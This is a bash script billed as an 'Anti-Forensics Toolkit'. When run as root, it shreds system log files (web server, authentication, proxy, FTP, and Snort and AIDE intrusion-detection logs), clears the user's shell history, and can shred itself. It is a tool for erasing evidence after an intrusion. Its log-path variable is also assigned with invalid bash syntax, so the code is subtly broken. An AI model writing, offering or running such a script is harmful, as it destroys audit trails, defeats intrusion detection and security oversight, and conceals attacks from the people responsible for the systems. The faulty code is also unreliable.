#!/bin/bash

# CAUTION: Note that shred relies on a very important assumption: that
# the file system overwrites data in place. This is the traditional way
# to do things, but many modern file system designs do not satisfy this
# assumption. The following are examples of file systems on which shred
# is not effective, or is not guaranteed to be effective in all file
# system modes:
# - log-structured or journaled file systems, such as those supplied with
#   AIX and Solaris (and JFS, ReiserFS, XFS, Ext3, etc.)
# - file systems that write redundant data and carry on even if some
#   writes fail, such as RAID-based file systems
# - server file systems that cache in temporary locations, such as NFS
#   version 3 clients;
# - compressed file systems.
# In the case of ext3 file systems, the above disclaimer applies (and
# shred is thus of limited effectiveness) only in data=journal mode,
# which journals file data in addition to just metadata. In both the
# data=ordered (default) and data=writeback modes, shred works as usual.
# Ext3 journaling modes can be changed by adding the data=something
# option to the mount options for a particular file system in the
# /etc/fstab file, as documented in the mount man page (man mount).

this_path=$(readlink -f $0)        ## Path of this file including filename
dir_name=`dirname ${this_path}`    ## Dir where BURN is
myname=`basename ${this_path}`     ## file name of the BURN script.
ROOT_UID=0    					   ## Only users with $UID 0 have root privileges.
E_NOTROOT=87   					   ## Non-root exit error.

# We need root.
if [ "$UID" -ne "$ROOT_UID" ]
then
  echo "You must be root to run this script."
  exit $E_NOTROOT
fi  

function usage {
  echo "
  usage: $myname [options]

  -d           hard delete each log file and command history of the current user
  -b           securely delete the script and exit
  -h           optional  Print this help message
  -q           optional  Suppress log messages on screen"
  exit 1
}

function logit {
  if [[ $quiet != "true" ]]
  then
    echo "$1";
  fi
}

function burnHistory {
	#  history entries has a copy in the memory and it will flush back to the file when you log out.
	cat /dev/null > /home/$(whoami)/.bash_history
	history -cw;
}

function burnburn {
	logit "burning burn...";
  	shred -z -u $this_path;
  	burnHistory;
  	logit "DONE";
  	exit;
}

function deleteEveryLog {
	baselogdir = "/var/log"
	declare -a logsdir=(    "httpd/access_log" # Logs requests for information from the Apache Web server
                            "httpd/error_log" # Logs errors encountered from clients trying to access data on Apache Web server
                            "secure" # Records the date, time, and duration of login attempts and sessions.
                            "messages" # A general-purpose log file to which many programs record messages.
                            "squid/access.log" # Contains messages related to the squid proxy/caching server.
                            "vsftpd.log" # Contains messages relating to transfers made using the vsFTPd daemon (FTP server)
                            "snort/*" # SNORT log files
                            "aide/aide.log" # AIDE, Advanced Intrusion Detection Environment
                        )

	for i in "${logsdir[@]}"
	do
	   if [[ "${i: -1}" == "*" ]]
	   then
	   	 find "$baselogdir/${i::-1}" -type f -exec shred -z -u {} \;
	   else
	   	 shred -u -z "$baselogdir/$i"
	   fi
	   	
	done

	burnHistory;
}


## Basic optional flags
[ $# -eq 0 ] && usage
while getopts :hqdb args
do
  case $args in
  h) usage ;;
  q) quiet='true' ;; ## Suppress messages, just log them.
  d) harddelete='true' ;; ## hard delete each log file on the system
  b) burnburn='true' ;;
  *) usage ;;
  esac
done



## Main function
function main {

  logit "[!] Initializing `date`"
  logit "
    )   
   ) \          -=[ Anti-Forensics Toolkit ]=-
  / ) (                   a phosphore's work  
  \(_)/                <me@lorenzostella.it>
   88                                              
   88                                              
   88                                              
   88,dPPYba,  88       88 8b,dPPYba, 8b,dPPYba,   
   88P      8a 88       88 88P     Y8 88P      8a  
   88       d8 88       88 88         88       88  
   88b,   ,a8   8a,   ,a88 88         88       88  
   8YYYbbd8      8YbbdPaY8 88         88       88  
  "

  if [[ $harddelete == "true" ]]
  then
  	deleteEveryLog
  fi

  if [[ $burnburn == "true" ]]
  then
  	burnburn
  fi


}

## Boot strap the script
main "$@"